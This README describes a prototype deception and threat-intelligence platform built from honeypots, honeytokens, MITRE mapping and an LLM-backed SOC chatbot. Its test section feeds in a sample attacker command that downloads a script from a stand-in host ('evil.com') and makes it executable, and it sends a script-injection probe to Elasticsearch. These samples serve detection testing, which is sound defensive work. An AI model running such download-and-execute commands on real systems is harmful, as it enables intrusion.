# AI-Driven Adaptive Cyber Deception and Threat Intelligence Platform

A research-grade prototype combining honeypots, threat intelligence,
MITRE ATT&CK mapping, RAG-backed attack memory, a SOC analyst chatbot, and
honeytokens — orchestrated entirely through Docker Compose.

See `docs/ARCHITECTURE.md` for the full data-flow diagram and component
notes, and `docs/API.md` for endpoint references. **For a complete,
module-by-module explanation of how everything works plus a full testing
walkthrough (automated tests → build → smoke tests → live attack
simulation → real sensor interaction), see `docs/COMPLETE_GUIDE.md`.**

## Status of this build

This pass delivers the **full 14-service Docker Compose skeleton** with
working (not stubbed) logic in every custom service:

- Telemetry: real regex-based IOC extraction + keyword-based MITRE mapping
- Escalation Engine: real rule-based classify → sequence-score → decide
  pipeline, with an optional pretrained DistilBERT signal blended in
  (`USE_PRETRAINED_NLP=true`)
- RAG Proxy: real ChromaDB-backed memory + Groq LLM calls
- HoneyTrap: real honeytoken generation, rotation, and access-alerting
- Dashboard: real Elasticsearch aggregations + live SOC chatbot

What's intentionally **not** done yet, per the agreed plan: the
DistilBERT/LSTM/DQN models described in the original spec are *interfaces*
with working rule-based implementations behind them, not trained models.
Every relevant class docstring (`escalation_engine/models.py`) documents
exactly how to swap in a trained model later without touching calling code.

This has been validated for **YAML and Python syntax correctness**, and
the custom services' logic is covered by an **automated pytest suite**
(`tests/` — 53 tests, all passing, no Docker required: `pip install -r
tests/requirements-test.txt && python3 -m pytest tests/ -v`). That suite
already caught and fixed two real bugs (a classification blind spot in
the Escalation Engine and a double-seeding bug in HoneyTrap) — see
`tests/README.md` for details. What it has **not** done yet is a real
`docker compose up` end-to-end run: container images (especially
Cowrie/Dionaea upstream bases) can drift, and that's the part that most
needs a real Docker host to verify next.

## Prerequisites

- Docker Engine 24+ and Docker Compose v2 (`docker compose version`)
- ~4 GB free RAM for the Elastic Stack alone; 6–8 GB recommended overall
- A [Groq API key](https://console.groq.com/keys) (free tier works) for
  the RAG proxy / SOC chatbot — or swap `LLM_PROVIDER` to `openai`/`ollama`

## Quickstart

```bash
cd honeypot-project
cp .env.example .env
# edit .env — at minimum set GROQ_API_KEY, and change every "changeme_*" password

docker compose config            # sanity-check the merged config first
docker compose build              # build all custom images
docker compose up -d               # bring up the full stack

docker compose ps                  # wait until everything reports "healthy"
```

Then open:
- **SOC Dashboard**: http://localhost:8501
- **Kibana**: http://localhost:5601
- **Telemetry API**: http://localhost:8003/docs (FastAPI auto-docs)
- **Escalation Engine API**: http://localhost:8001/docs
- **RAG Proxy API**: http://localhost:8002/docs
- **HoneyTrap API**: http://localhost:8004/docs

## Generating demo data

The stack starts with zero attack data. Two ways to populate it without
needing a real external attacker:

```bash
pip install -r scripts/requirements.txt

# Option A — randomized multi-stage scenarios, also probes Elastichoney + HoneyTrap
python scripts/simulate_attack.py --target http://localhost

# Option B — deterministic, labeled dataset (see scripts/sample_attack_dataset.json)
python scripts/load_sample_dataset.py --target http://localhost
```

Then check the dashboard's Overview tab, or ask the SOC Chatbot tab
"What attacks occurred today?" or "Generate an incident report."

To exercise the *real* sensor layer instead of the `/ingest` shortcut:

```bash
ssh -p 2222 root@localhost          # any password works against Cowrie
curl http://localhost:9201/_search -X POST -d '{"script":"id"}'   # Elastichoney
curl -u test:test ftp://localhost:2121                              # Dionaea
```

Give Filebeat/Logstash a few seconds to ship those into Elasticsearch,
then Telemetry's poll loop (every `TELEMETRY_POLL_INTERVAL_SECONDS`,
default 10s) will pick them up automatically.

## Testing

### Automated (no Docker needed)

```bash
pip install -r tests/requirements-test.txt
python3 -m pytest tests/ -v
```

53 tests covering IOC extraction, MITRE mapping, the escalation engine's
full classify→score→decide pipeline, honeytoken generation, and the
Elastichoney/Escalation Engine/HoneyTrap HTTP APIs (Redis faked via
`fakeredis`, Elasticsearch faked via a minimal stub). See `tests/README.md`
for what is and isn't covered.

### Manual / end-to-end (requires the running stack)

```bash
# Service health
curl http://localhost:8001/health
curl http://localhost:8002/health
curl http://localhost:8003/health
curl http://localhost:8004/health
curl http://localhost:9201/health

# End-to-end: feed a malicious-looking command straight into the pipeline
curl -X POST http://localhost:8003/ingest \
  -H "Content-Type: application/json" \
  -d '{"honeypot":"cowrie","text":"wget http://evil.com/x.sh && chmod 777 x.sh","session":"test-1","src_ip":"203.0.113.5"}'

# Confirm it escalated
curl http://localhost:8001/sessions/escalated

# Confirm a honeytoken alert fires
TOKEN_ID=$(curl -s http://localhost:8004/tokens | python3 -c "import sys,json; print(json.load(sys.stdin)['tokens'][0]['id'])")
curl -X POST http://localhost:8004/tokens/$TOKEN_ID/access \
  -H "Content-Type: application/json" -d '{"source_ip":"203.0.113.5","detail":"test"}'
curl http://localhost:8004/alerts
```

## Security notes

- `.env` is gitignored — never commit real API keys or passwords.
- Honeypots (`cowrie`, `dionaea`, `elastichoney`) run on an isolated
  `edge_net` Docker network with **no route** to Elasticsearch, Redis,
  ChromaDB, or any AI service — see `docs/ARCHITECTURE.md`.
- All generated SSH keys/AWS keys/tokens in HoneyTrap are synthetic — they
  are never valid against any real service.
- Before exposing this beyond localhost, put it behind a reverse proxy
  with auth in front of Kibana, the dashboard, and every `/docs` endpoint;
  none of them have authentication built in for this demo.

## Known follow-ups (next iteration)

1. Wire HoneyTrap's generated tokens into Cowrie's actual decoy filesystem
   (`honeyfs/`) so attackers can `cat` them mid-session, not just via API.
2. Fine-tune DistilBERT on a labeled command corpus once one exists; the
   interface in `escalation_engine/models.py` doesn't need to change.
3. Train the LSTM sequence model and DQN decision policy once enough
   labeled session data has been collected from real runs.
4. Add Kibana index pattern / dashboard provisioning (currently manual).
5. Add an automated test suite (currently manual curl-based testing only).
